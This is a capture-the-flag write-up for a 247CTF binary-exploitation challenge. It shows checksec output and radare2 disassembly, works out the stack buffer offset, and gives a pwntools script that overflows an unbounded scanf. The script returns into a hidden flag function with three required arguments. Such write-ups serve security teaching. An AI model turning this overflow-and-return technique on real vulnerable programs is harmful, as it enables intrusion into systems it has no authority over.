hidden_flag_function_parameter

checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

@main function

```
┌ 86: int main (char **argv);
│           ; var int32_t var_8h @ ebp-0x8
│           ; arg char **argv @ esp+0x24
│           0x08048632      8d4c2404       lea ecx, [argv]
│           0x08048636      83e4f0         and esp, 0xfffffff0
│           0x08048639      ff71fc         push dword [ecx - 4]
│           0x0804863c      55             push ebp
│           0x0804863d      89e5           mov ebp, esp
│           0x0804863f      53             push ebx
│           0x08048640      51             push ecx
│           0x08048641      e86afeffff     call sym.__x86.get_pc_thunk.bx
│           0x08048646      81c3ba190000   add ebx, 0x19ba
│           0x0804864c      8b83fcffffff   mov eax, dword [ebx - 4]
│           0x08048652      8b00           mov eax, dword [eax]
│           0x08048654      83ec08         sub esp, 8
│           0x08048657      6a00           push 0                      ; char *buf
│           0x08048659      50             push eax                    ; FILE *stream
│           0x0804865a      e881fdffff     call sym.imp.setbuf         ; void setbuf(FILE *stream, char *buf)
│           0x0804865f      83c410         add esp, 0x10
│           0x08048662      83ec0c         sub esp, 0xc
│           0x08048665      8d8348e7ffff   lea eax, [ebx - 0x18b8]
│           0x0804866b      50             push eax                    ; const char *s
│           0x0804866c      e89ffdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x08048671      83c410         add esp, 0x10
│           0x08048674      e884ffffff     call sym.chall
│           0x08048679      b800000000     mov eax, 0
│           0x0804867e      8d65f8         lea esp, [var_8h]
│           0x08048681      59             pop ecx
│           0x08048682      5b             pop ebx
│           0x08048683      5d             pop ebp
│           0x08048684      8d61fc         lea esp, [ecx - 4]
└           0x08048687      c3             ret
```
@ chall function

```
┌ 53: sym.chall ();
│           ; var int32_t var_88h @ ebp-0x88
│           ; var int32_t var_4h @ ebp-0x4
│           0x080485fd      55             push ebp
│           0x080485fe      89e5           mov ebp, esp
│           0x08048600      53             push ebx
│           0x08048601      81ec84000000   sub esp, 0x84
│           0x08048607      e87c000000     call sym.__x86.get_pc_thunk.ax
│           0x0804860c      05f4190000     add eax, 0x19f4
│           0x08048611      83ec08         sub esp, 8
│           0x08048614      8d9578ffffff   lea edx, [var_88h]
│           0x0804861a      52             push edx
│           0x0804861b      8d9043e7ffff   lea edx, [eax - 0x18bd]
│           0x08048621      52             push edx                    ; const char *format
│           0x08048622      89c3           mov ebx, eax
│           0x08048624      e817feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format)
│           0x08048629      83c410         add esp, 0x10
│           0x0804862c      90             nop
│           0x0804862d      8b5dfc         mov ebx, dword [var_4h]
│           0x08048630      c9             leave
└           0x08048631      c3             ret

```
@ flag function
```
┌ 135: sym.flag (uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h);
│           ; var char *s @ ebp-0x8c
│           ; var file*stream @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4
│           ; arg uint32_t arg_8h @ ebp+0x8
│           ; arg uint32_t arg_ch @ ebp+0xc
│           ; arg uint32_t arg_10h @ ebp+0x10
│           0x08048576      55             push ebp
│           0x08048577      89e5           mov ebp, esp
│           0x08048579      53             push ebx
│           0x0804857a      81ec94000000   sub esp, 0x94
│           0x08048580      e82bffffff     call sym.__x86.get_pc_thunk.bx
│           0x08048585      81c37b1a0000   add ebx, 0x1a7b
│           0x0804858b      817d08371300.  cmp dword [arg_8h], 0x1337
│       ┌─< 0x08048592      7563           jne 0x80485f7
│       │   0x08048594      817d0c470200.  cmp dword [arg_ch], 0x247
│      ┌──< 0x0804859b      755a           jne 0x80485f7
│      ││   0x0804859d      817d10785634.  cmp dword [arg_10h], 0x12345678
│     ┌───< 0x080485a4      7551           jne 0x80485f7
│     │││   0x080485a6      83ec08         sub esp, 8
│     │││   0x080485a9      8d8310e7ffff   lea eax, [ebx - 0x18f0]
│     │││   0x080485af      50             push eax                    ; const char *mode
│     │││   0x080485b0      8d8312e7ffff   lea eax, [ebx - 0x18ee]
│     │││   0x080485b6      50             push eax                    ; const char *filename
│     │││   0x080485b7      e874feffff     call sym.imp.fopen          ; file*fopen(const char *filename, const char *mode)
│     │││   0x080485bc      83c410         add esp, 0x10
│     │││   0x080485bf      8945f4         mov dword [stream], eax
│     │││   0x080485c2      83ec04         sub esp, 4
│     │││   0x080485c5      ff75f4         push dword [stream]         ; FILE *stream
│     │││   0x080485c8      6880000000     push 0x80                   ; 128 ; int size
│     │││   0x080485cd      8d8574ffffff   lea eax, [s]
│     │││   0x080485d3      50             push eax                    ; char *s
│     │││   0x080485d4      e827feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
│     │││   0x080485d9      83c410         add esp, 0x10
│     │││   0x080485dc      83ec08         sub esp, 8
│     │││   0x080485df      8d8574ffffff   lea eax, [s]
│     │││   0x080485e5      50             push eax
│     │││   0x080485e6      8d831ce7ffff   lea eax, [ebx - 0x18e4]
│     │││   0x080485ec      50             push eax                    ; const char *format
│     │││   0x080485ed      e8fefdffff     call sym.imp.printf         ; int printf(const char *format)
│     │││   0x080485f2      83c410         add esp, 0x10
│    ┌────< 0x080485f5      eb01           jmp 0x80485f8
│    ││││   ; CODE XREFS from sym.flag @ 0x8048592, 0x804859b, 0x80485a4
│    │└└└─> 0x080485f7      90             nop
│    │      ; CODE XREF from sym.flag @ 0x80485f5
│    └────> 0x080485f8      8b5dfc         mov ebx, dword [var_4h]
│           0x080485fb      c9             leave
└           0x080485fc      c3             ret

```
flag function require the arguments for open flag file.


buffer_size = 0x88 or 0x88 + 0x4
```
[0x08048632]> pdf @ sym.chall
            ; CALL XREF from main @ 0x8048674
┌ 53: sym.chall ();
│           ; var int32_t var_88h @ ebp-0x88
│           ; var int32_t var_4h @ ebp-0x4
```

```
┌ 135: sym.flag (uint32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h);
│           ; var char *s @ ebp-0x8c
│           ; var file*stream @ ebp-0xc
│           ; var int32_t var_4h @ ebp-0x4       > for return ?????
│           ; arg uint32_t arg_8h @ ebp+0x8      > for argument
│           ; arg uint32_t arg_ch @ ebp+0xc      > for argument
│           ; arg uint32_t arg_10h @ ebp+0x10    > for argument
```

payload:

padding (0x88) + padding (0x4) + flag_addr + padding (0x4) + arg1 + arg2 + arg3 

create the script:

```
#!/usr/bin/python3

from pwn import *

host,port = "addb84cd52e830b3.247ctf.com",50255


binary = ELF("hidden_flag_function_with_args")
junkdata = b"A"*(0x88)

base_addr = p32(0x8048000)
arg1 = p32(0x12345678)
arg2 = p32(0x247)
arg3 = p32(0x1337)

addr = p32(binary.symbols["flag"])
#p = remote(host,port)
p = process(binary.path)

p.clean()

payload = junkdata + b"A"*4 + addr + b"B"*4 + arg3 + arg2 + arg1
p.sendline(payload)

p.interactive()
```
